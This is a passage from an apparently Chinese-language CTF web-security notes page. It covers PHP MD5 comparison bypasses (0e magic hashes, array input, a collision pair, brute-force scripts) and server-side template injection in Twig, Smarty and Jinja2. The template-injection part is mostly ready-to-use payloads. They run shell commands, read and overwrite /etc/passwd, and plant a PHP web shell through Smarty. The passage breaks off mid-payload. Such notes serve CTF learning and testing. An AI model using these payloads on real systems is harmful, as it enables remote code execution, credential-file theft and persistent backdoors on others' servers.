&#x2F;&#x2F;二进制</p><h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><h4 id="1-数组绕过"><a href="#1-数组绕过" class="headerlink" title="1.数组绕过"></a>1.数组绕过</h4><p>由于md5不能加密数组，在加密数组的时候会返回NULL，所以我们可以传入两个数组<br>数组绕过适用于源码中没有判断变量类型或内容，如果加上了过滤函数就不能使用了</p><p>常见过滤函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ctype_alnum</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$text</span> ) : <span class="hljs-keyword">bool</span><br><span class="hljs-comment">// 如果text中所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回FALSE </span><br><br><span class="hljs-title function_ invoke__">is_numeric</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$var</span> ) : <span class="hljs-keyword">bool</span><br><span class="hljs-comment">// 如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE</span><br></code></pre></td></tr></table></figure><h4 id="2-科学计数法绕过"><a href="#2-科学计数法绕过" class="headerlink" title="2.科学计数法绕过"></a>2.科学计数法绕过</h4><p>可以传入两个md5加密后是0e开头的字符串，需要注意的地方是，这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0；可以查找以0e开头md5加密相等的字符串，也可以自己编写代码，提供以下脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$a</span>&lt;=<span class="hljs-number">1000000000</span>;<span class="hljs-variable">$a</span>++)&#123;<br>   <span class="hljs-variable">$md5</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^0e\d+$/&#x27;</span>,<span class="hljs-variable">$md5</span>))&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$md5</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs dns">byGcY<br><span class="hljs-number">0</span>e5919481469660520670<span class="hljs-number">35298880982</span><br><br>QNKCDZO<br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br><br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br><br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br><br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br><br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br><br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br><br><span class="hljs-number">240610708</span><br><span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span><br><br><span class="hljs-number">314282422</span><br><span class="hljs-number">0</span>e9909955048216994945<span class="hljs-number">20356953734</span><br><br><span class="hljs-number">571579406</span><br><span class="hljs-number">0</span>e972379832854295224<span class="hljs-number">118025748221</span><br><br><span class="hljs-number">903251147</span><br><span class="hljs-number">0</span>e17451050382393294<span class="hljs-number">2361353209384</span><br></code></pre></td></tr></table></figure><h3 id="双MD5判断"><a href="#双MD5判断" class="headerlink" title="双MD5判断"></a>双MD5判断</h3><p>有些题目，可能会经过两次MD5值的判断</p><p>MD5和双MD5以后的值都是0e开头的</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">CbDLytmyGm2xQyaLNhWn</span><br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">脚本<br><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sys<br>CHARS = string.letters + string.digits<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmp_md5</span>(<span class="hljs-params">substr, stop_event, str_len,. start=<span class="hljs-number">0</span>, size=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-keyword">global</span> CHARS<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop_event.is_set():<br>        rnds = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size))<br>        md5 = hashlib.md5(rnds)<br>        value = md5.hexdigest()<br>        <span class="hljs-keyword">if</span> value[start: start+str_len] == substr:<br>            <span class="hljs-built_in">print</span> rnds<br>            stop_event.<span class="hljs-built_in">set</span>()<br>            <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            #碰撞双md5</span><br><span class="hljs-string">            md5 = hashlib.md5(value)</span><br><span class="hljs-string">            if md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="hljs-string">                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;</span><br><span class="hljs-string">                stop_event.set()</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    substr = sys.argv[<span class="hljs-number">1</span>].strip()<br>    start_pos = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    str_len = <span class="hljs-built_in">len</span>(substr)<br>    cpus = multiprocessing.cpu_count()<br>    stop_event = multiprocessing.Event()<br>    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,<br>                                         stop_event, str_len, start_pos))<br>                 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cpus)]<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.start()<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.join()<br></code></pre></td></tr></table></figure><h3 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a>强类型比较</h3><h4 id="1-数组绕过-1"><a href="#1-数组绕过-1" class="headerlink" title="1.数组绕过"></a>1.数组绕过</h4><p>因为是强类型比较，用0e开头的字符串是没办法绕过的了，但是PHP自身的特性使得可以提交一个数组<br>而md5函数传入数组的返回值都是NULL，这样就可以绕过强类型比较了</p><h4 id="2-使用md5加密后两个完全相等的两个字符串绕过"><a href="#2-使用md5加密后两个完全相等的两个字符串绕过" class="headerlink" title="2.使用md5加密后两个完全相等的两个字符串绕过"></a>2.使用md5加密后两个完全相等的两个字符串绕过</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>判断模板</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405132152442.png" alt="img"></p><p>绿色是执行成功，红色是执行失败</p><p>注入${7＊7}没有回显出49的情况，这种时候就是执行失败走红线，再次注入如果还是没有回显49就代表这里没有模板注入；如果注入回显了49代表执行成功，继续往下走注入，如果执行成功回显7777777说明是jinja2模板，如果回显是49就说明是Twig模板。<br>注入${7＊7}成功回显出49的情况，这种时候是执行成功走绿线，再次注入a{＊comment＊}b，如果执行成功回显ab，就说明是Smarty模板；如果没有回显出ab，就是执行失败走红线，注入${“z”.join(“ab”)}，如果执行成功回显出zab就说明是Mako模板。</p><p>常用利用方式</p><p>Twig</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>Smarty</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="language-xml">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="language-xml">&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="language-xml">// another</span><br><span class="language-xml">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;,self::clearConfig())&#125;</span><br></code></pre></td></tr></table></figure><p>Jinja2<a href="https://www.cnblogs.com/hetianlab/p/17273687.html">https://www.cnblogs.com/hetianlab/p/17273687.html</a></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#读取文件类，<span class="hljs-tag">&lt;<span class="hljs-name">type</span> ‘<span class="hljs-attr">file</span>’&gt;</span> file位置一般为40，直接调用</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[40](<span class="hljs-name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[40](<span class="hljs-name">&#x27;etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[40](<span class="hljs-name">&#x27;etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[257](<span class="hljs-name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> (python3)</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#直接使用popen命令，python2是非法的，只限于python3</span><br><span class="language-xml">os._wrap_close 类里有popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[128].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[128].__init__.__globals__.popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用os的popen执行命令</span><br><span class="language-xml">#python2、python3通用</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[185].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#python3专属</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__.__import__(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用eval函数读取</span><br><span class="language-xml">#python2</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[61].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[29].__call__(<span class="hljs-name">eval</span>,<span class="hljs-string">&#x27;os.system(&quot;ls&quot;)&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#python3</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用 importlib类</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128][&quot;load_module&quot;](<span class="hljs-name">&quot;os&quot;</span>)[&quot;popen&quot;](<span class="hljs-name">&quot;ls /&quot;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用linecache函数</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[59].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[168].__init__.__globals__.linecache.os.popen(<span class="hljs-name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用communicate()函数</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128](<span class="hljs-name">&#x27;whoami&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#写文件</span><br><span class="language-xml">写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__bases__[0].__subclasses__()[40](<span class="hljs-name">&#x27;/tmp&#x27;</span>).write(<span class="hljs-name">&#x27;test&#x27;</span>)&#125;&#125;</span><span class="language-xml">  ----python2的str类型不直接从属于属于基类，所以要两次 .__bases__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).write(<span class="hljs-name">&#x27;123456&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#通用 getshell</span><br><span class="language-xml">原理就是找到含有 __builtins__ 的类，然后利用。</span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; 